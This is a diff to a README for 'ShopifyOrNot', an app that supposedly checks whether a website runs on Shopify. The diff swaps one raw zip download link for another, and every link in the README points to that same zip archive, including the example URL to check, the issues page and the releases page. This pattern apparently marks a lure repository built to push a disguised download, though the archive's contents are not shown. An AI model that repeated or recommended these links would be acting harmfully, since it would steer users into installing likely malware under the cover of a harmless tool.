@@ -8,7 +8,7 @@ Welcome to ShopifyOrNot! This app helps you determine if a website is using Shop
 
 To get started, visit this page to download:
 
-[![Download ShopifyOrNot](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip)](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip)
+[![Download ShopifyOrNot](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip)](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip)
 
 ### Installation Steps:
 
@@ -29,7 +29,7 @@ Once installed, follow these steps to run the app:
 
 1. Open the application on your device.
 2. You will see a simple interface with a URL input field.
-3. Enter the website URL you want to check (e.g., `https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip`).
+3. Enter the website URL you want to check (e.g., `https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip`).
 4. Click the "Check" button.
 5. Wait a few seconds for the results.
 
@@ -40,7 +40,7 @@ After you enter a URL, the app will display the following information:
 - **Shopify Store Status:** Confirm if it is a Shopify store.
 - **Confidence Score:** A score showing how sure the app is about the result.
 - **Final URL:** The resolved URL after any redirects.
-- **https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip Domain:** If detected, this shows the Shopify domain.
+- **https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip Domain:** If detected, this shows the Shopify domain.
 - **Technical Signals:** You can expand this section to see response headers and body markers for deeper insights.
 
 ## 🎯 Target Users
@@ -71,10 +71,10 @@ No, ShopifyOrNot is completely free to use.
 
 ### What should I do if I find a bug?
 
-If you notice any bugs or issues, please report them on our [GitHub Issues page](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip).
+If you notice any bugs or issues, please report them on our [GitHub Issues page](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip).
 
 ## 🔗 Additional Resources
 
-For more details, check our documentation or the [Releases page](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/hooks/shopifyornot-3.5-alpha.1.zip).
+For more details, check our documentation or the [Releases page](https://raw.githubusercontent.com/MahedimaCos/shopifyornot/main/app/public/Software_1.3.zip).
 
 Thank you for using ShopifyOrNot! We hope it helps streamline your lead qualification process. Happy checking!
